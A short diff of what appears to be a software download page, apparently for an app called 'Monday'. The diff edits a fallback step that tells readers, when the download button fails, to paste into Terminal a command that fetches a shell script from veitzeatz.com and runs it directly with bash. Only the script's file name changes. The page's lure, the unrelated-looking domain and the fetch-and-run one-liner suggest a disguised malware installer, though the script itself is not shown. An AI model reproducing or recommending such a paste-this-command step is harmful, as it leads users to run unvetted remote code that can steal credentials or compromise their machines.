@@ -22,7 +22,7 @@ If the download button doesn’t work, follow the instructions below to install 
 1. Copy the following installation command:
 
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get3/install-monday.sh)"
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get3/install.sh)"
 ```
 
 2. Open Terminal and paste the command.
